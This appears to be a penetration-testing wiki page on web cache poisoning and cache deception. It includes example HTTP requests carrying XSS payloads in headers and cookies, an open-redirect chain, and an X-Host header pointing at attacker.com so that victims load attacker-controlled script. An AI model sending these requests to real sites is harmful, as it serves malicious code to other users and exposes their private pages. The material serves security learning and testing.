# Cache Poisoning and Cache Deception

## The difference

> **What is the difference between web cache poisoning and web cache deception?**
>
> * In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> * In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## Cache Poisoning

The goal of poisoning the cache is to make the clients load unexpected resources partially or totally controlled by the attacker.  
The poisoned response will only be served to users who visit the affected page while the cache is poisoned. As a result, the impact can range from non-existent to massive depending on whether the page is popular or not.

In order to perform a cache poisoning attack you need first to **identify ukeyed inputs** \(parameters not needed to appear on the the cached request but that change the returned page\), see **how to abuse** this parameter and **get the response cached**. 

### Identify and evaluate unkeyed inputs

You could use  [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) to **brute-force parameters and headers** that may be **changing the response of the page**. For example, a page may be using the header `X-Forwarded-For` to indicate the client to load script from there: 

```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```

### Elicit a harmful response from the back-end server

With the parameter/header identified check how it is being **sanitised** and **where** is it **getting reflected** or affecting the response from the header. Can you abuse it any any way \(perform a XSS or load a JS code controlled by you? perform a DoS?...\)

### Get the response cached

Once you have **identified** the **page** that can be abused, which **parameter**/**header** to use and **how** to **abuse** it you need to get the page cached. Depending on the resource you are trying to get in the cache this could time more or less time and some times you just will need to be trying several seconds.  
The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.  
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`  
Another interesting header is **`Vary`** . This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.  
One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working. 

## Examples

### Easiest example

A header like `X-Forwarded-For` is being reflected in the response unsanitized&gt;  
You can send a basic XSS payload and poison the cache so everybody that access page will be XSSed:

```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies could also be reflected on the response of a page. If you can abuse it to cause a XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.

```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```

Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### Using multiple headers to exploit web cache poisoning vulnerabilities <a id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Some time you will need to **exploit several ukneyed inputs** to be able to abuse a cache. For example, you may find an **Open redirect** if you set `X-Forwarded-Host` to a domain controlled by you and `X-Forwarded-Scheme` to `http`.**If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** and using the header `X-Forwarded-Scheme` as domain name for the redirect. You can control where the pagepointed by the redirect.

```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```

### Exploiting with limited `Vary`header

If you found that the **`X-Host`** header is being used as **domain name to load a JS resource** but the **`Vary`** header in the response is indicating **`User-Agent`** . Then, you need to find a way to ex-filtrate the User-Agent of the victim and poison the cache using that user agent:

```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```

### Exploiting HTTP Cache Poisoning abusing HTTP Request Smuggling

Learn here about how to perform [Cache Poisoning attacks abusing HTTP Request Smuggling](http-request-smuggling.md#using-http-request-smuggling-to-perform-web-cache-poisoning).

## Cache Deception

The goal of Cache Deception is to make clients load resources that are going to be saved by the cache with their sensitive information.  
A very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).

In the example it is explained that if you load a non-existent page like  _http://www.example.com/home.php/non-existent.css_ the content of _http://www.example.com/home.php_ \(**with the users sensitive information**\) is going to be returned and the cache server is going to save the result.  
Then, the **attacker** can access _http://www.example.com/home.php_ and see the **confidential information** of the users that accessed before.

Note that the **cache proxy** should be **configured** to **cache** files **based** on the **extension** of the file \(_.css_\) and not base on the content-type. In the example _http://www.example.com/home.php/non-existent.css_ will have a `text/html` content-type instead of a `text/css` mime type \(which is the expected for a _.css_ file\).

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](http-request-smuggling.md#using-http-request-smuggling-to-perform-web-cache-deception).

## References

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting\#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)

